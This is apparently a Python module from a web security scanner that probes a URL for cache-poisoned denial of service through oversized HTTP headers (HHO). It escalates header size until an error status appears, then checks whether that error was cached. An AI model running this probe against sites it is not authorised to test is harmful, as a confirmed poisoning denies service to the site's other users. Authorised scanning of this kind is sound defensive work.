#!/usr/bin/env python3

"""
Attempts to find Cache Poisoning with HTTP Header Oversize (HHO)
https://cpdos.org/#HHO
"""

import utils.proxy as proxy
from utils.style import Colors, Identify
from utils.utils import configure_logger, human_time, requests, random
from utils.print_utils import cache_tag_verify

logger = configure_logger(__name__)

VULN_NAME = "HTTP Header Oversize"


def HHO(
    url: str,
    s: requests.Session,
    main_response: requests.Response,
    authent: tuple[str, str] | None,
    human: str,
) -> None:
    """
    Perform a Header Oversize Denial of Service (HHO DOS) attack on the given URL.

    This function attempts to detect and confirm a vulnerability by sending oversized headers
    to the target URL and observing the response status codes. If a specific error status code
    is detected, it indicates a potential vulnerability.

    Args:
        url: The target URL to test.
        s: The session object to use for making requests.
        main_response: The initial response from the target URL.
        authent: Authentication credentials (username, password) for the target URL.
        human: Human-readable timing parameter.

    Returns:
        None
    """
    error_detected = False
    max_iterations = 200
    iteration = 0
    main_status_code = main_response.status_code

    big_value = "Big-Value-0"

    while iteration < max_iterations and not error_detected:
        big_value = big_value + "0" * 50
        h = {f"X-Oversized-Header-{iteration}": f"{big_value}"}
        uri = f"{url}{random.randrange(9999)}"
        
        try:
            probe = s.get(
                uri,
                headers=h,
                auth=authent,
                allow_redirects=False,
                verify=False,
                timeout=10,
            )

            logger.debug(
                "STATUS (%s)\nHeaders :(%s)",
                probe.status_code,
                h,
            )

            if (
                probe.status_code in [400, 413, 500, 502]
                and probe.status_code != main_status_code
            ):
                logger.debug(
                    "CPDOS : URL (%s) STATUS (%s) Headers :(%s)",
                    uri,
                    probe.status_code,
                    probe.headers,
                )
                error_detected = True
            iteration += 1
            human_time(human)

            print(
                f" {Colors.BLUE} {VULN_NAME} : X-Oversized-Header-{iteration}{Colors.RESET}\r",
                end="",
            )
            print("\033[K", end="")

        except requests.exceptions.ConnectionError as e:
            logger.exception(e)

    if error_detected:
        try:
            verify = s.get(
                uri, auth=authent, allow_redirects=False, verify=False, timeout=10
            )
            if (
                verify.status_code in [400, 413, 500, 502]
                and verify.status_code != main_status_code
            ):
                reason = (
                    f"DIFFERENT STATUS-CODE {main_status_code} > {verify.status_code}"
                )
                status = f"{Identify.confirmed}"
                severity = "confirmed"

            else:
                reason = (
                    f"DIFFERENT STATUS-CODE {main_status_code} > {probe.status_code}"
                )
                status = f"{Identify.behavior}"
                severity = "behavior"
            print(
                f" {status} | HHO DOS | {reason} | CACHETAG {cache_tag_verify(verify)} | {Colors.BLUE}{uri}{Colors.RESET} | PAYLOAD: {Colors.THISTLE}X-Oversized-Header-x: Big-Value-0*{len(big_value) - len('Big-Value-0')}{Colors.RESET}"
            )
            if proxy.proxy_enabled:
                from utils.proxy import proxy_request

                proxy_request(s, "GET", uri, headers=h, data=None, severity=severity)

        except requests.exceptions.ConnectionError as e:
            logger.exception(e)
